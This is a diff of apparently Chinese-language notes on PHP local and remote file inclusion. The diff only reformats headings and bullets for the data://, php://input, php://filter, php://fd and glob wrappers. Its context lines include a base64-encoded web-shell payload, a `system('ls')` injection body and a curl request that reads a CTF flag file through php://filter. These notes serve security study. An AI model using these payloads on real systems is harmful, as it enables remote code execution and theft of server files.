@@ -158,10 +158,10 @@ allow_url_include=On 就是远程文件包含，Off就是本地文件包含
 
 > “zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)
 
-* php 自带协议
+### php 自带协议
 
 
-** data:// **
+* ** data:// ** 
 
 Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur
 
@@ -204,7 +204,7 @@ PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxp
 PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
 ```
 
-** php://input ** -- php的输入流，可以读到没有处理过的POST数据
+* ** php://input ** -- php的输入流，可以读到没有处理过的POST数据
 
 >  php5.0以下 和 php5.2 版本有效, allow_url_include=On
 
@@ -218,7 +218,7 @@ post:
 <?php system('ls');?>
 ```
 
-** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。
+* ** php://filter **-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。
 
 > php5.0以上
 
@@ -234,11 +234,11 @@ post:
 $ curl ctf.sharif.edu:31455/chal/technews/634770c075a17b83/images.php?id=php://filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt
 ```
 
-** php://fd **
+* ** php://fd **
 
 > php 5.3.6中新增加
 
-** glob **
+* ** glob **
 
 > php>5.3.0
 
